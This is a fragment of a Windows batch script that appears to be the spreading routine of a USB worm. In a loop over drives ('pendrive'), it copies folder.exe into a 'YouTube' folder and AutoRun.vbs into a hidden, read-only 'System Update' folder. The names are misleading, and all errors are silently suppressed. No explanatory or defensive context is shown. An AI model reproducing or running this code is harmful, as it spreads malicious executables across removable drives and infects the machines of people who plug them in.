		 if not exist "%%i\YouTube\folder.exe" (
		        copy "C:\Users\Public\Licence\Extension\folder.exe" "%%i\YouTube" /Y > nul 2> nul
		 	if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i\YouTube" /Y > nul 2> nul
		 )




                 if not exist "%%i\System Update" mkdir "%%i\System Update" > nul 2> nul
		 attrib +h +r "%%i\System Update" /s /d > nul 2> nul



		 if not exist "%%i\YouTube\AutoRun.vbs" (
		        copy "C:\Users\Public\Licence\Extension\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
		 	if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
		 )
		 
		 echo Copied!



		 ) 
	  )
	  echo.
	  echo.
	  cls
          echo Click close to close the window...


	  goto pendrive




	exit /b  
  
  